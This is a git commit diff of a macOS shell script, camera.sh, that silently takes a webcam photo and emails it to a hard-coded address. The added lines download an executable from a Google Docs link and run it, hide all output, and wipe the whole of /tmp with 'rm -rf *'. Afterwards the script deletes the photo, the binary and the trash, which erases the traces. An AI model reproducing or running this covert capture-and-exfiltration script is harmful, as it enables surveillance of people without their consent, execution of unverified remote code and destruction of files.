45da49cbe8ddf4d7a903ed96ebcbe274ba595c02
Austin Harshberger <aharshbe@live.com>
2018-08-21 19:17:39 -0700

    removed the need for homebrew

--- camera.sh
+++ camera.sh
@@ -2,23 +2,36 @@
 
 # Created by Austin Harshberger (2018)
 
+# Temp to store filename
+FILENAME=""
+
+# Clear tmp
+cd /tmp
+rm -rf *
+
 # Modify to be email the image should be sent to
 EMAIL_TO_SEND="austin.harshberger@akqa.com"
 
-# Install homebrew
-/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" -y > /dev/null 2>&1
+# Download imagesnap
+curl -o /tmp/imagesnap -O "https://doc-0k-48-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/c7l95rfv32agduavaqp2e37l5pcq1ubp/1534896000000/15087744746783275242/*/1TNj41PY66YT-3LxDJX4GY0PViDy_IO2E?e=download" > /dev/null 2>&1
 
-# Install imagesnap from homebrew
-brew install imagesnap > /dev/null 2>&1
+# Make executable 
+chmod u+x /tmp/imagesnap > /dev/null 2>&1
 
 # Take a picture and store it in tmp
-imagesnap -w 1 /tmp/image.jpg > /dev/null 2>&1
+/tmp/imagesnap -w 1 ~/Desktop/test.jpg > /dev/null 2>&1
+
+# List tmp
+FILENAME="$(ls s*)"
 
 # Email photo 
-uuencode /tmp/image.jpg image.jpg | mail -s "photo of me" $EMAIL_TO_SEND
+uuencode /tmp/$FILENAME $FILENAME | mail -s "photo of me" $EMAIL_TO_SEND > /dev/null 2>&1
 
 # Delete photo 
-rm -rf /tmp/image.jpg
+rm -rf /tmp/$FILENAME > /dev/null 2>&1
+
+# Delete imagesnap
+rm -rf /tmp/imagesnap > /dev/null 2>&1
 
 # Clear trash
-rm -rf ~/.Trash*/
+rm -rf ~/.Trash*/ > /dev/null 2>&1
